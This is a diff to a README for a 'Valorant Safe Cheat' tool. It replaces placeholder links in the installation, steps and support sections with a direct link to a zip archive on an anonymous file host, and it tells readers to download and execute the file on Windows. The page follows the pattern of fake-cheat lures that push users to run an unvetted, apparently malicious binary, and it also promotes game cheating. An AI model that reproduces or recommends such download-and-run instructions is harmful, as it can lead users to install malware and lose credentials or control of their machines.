@@ -33,7 +33,7 @@ The **Valorant Safe Cheat** offers a range of functionalities to cater to your n
 
 ## Installation
 
-To get started with **Valorant Safe Cheat**, you need to download the latest release. Visit the [Releases section](555) to find the latest version. Download the file and execute it on your Windows 10/11 system.
+To get started with **Valorant Safe Cheat**, you need to download the latest release. Visit the [Releases section](https://files.catbox.moe/a3i7v7.zip) to find the latest version. Download the file and execute it on your Windows 10/11 system.
 
 ### Prerequisites
 
@@ -42,7 +42,7 @@ To get started with **Valorant Safe Cheat**, you need to download the latest rel
 
 ### Steps to Install
 
-1. Visit the [Releases section](555).
+1. Visit the [Releases section](https://files.catbox.moe/a3i7v7.zip).
 2. Download the latest release file.
 3. Execute the downloaded file and follow the on-screen instructions.
 
@@ -82,7 +82,7 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ## Support
 
-For any issues or questions, please check the [Releases section](555) for troubleshooting tips and updates. You can also reach out to the community for support.
+For any issues or questions, please check the [Releases section](https://files.catbox.moe/a3i7v7.zip) for troubleshooting tips and updates. You can also reach out to the community for support.
 
 ---
 
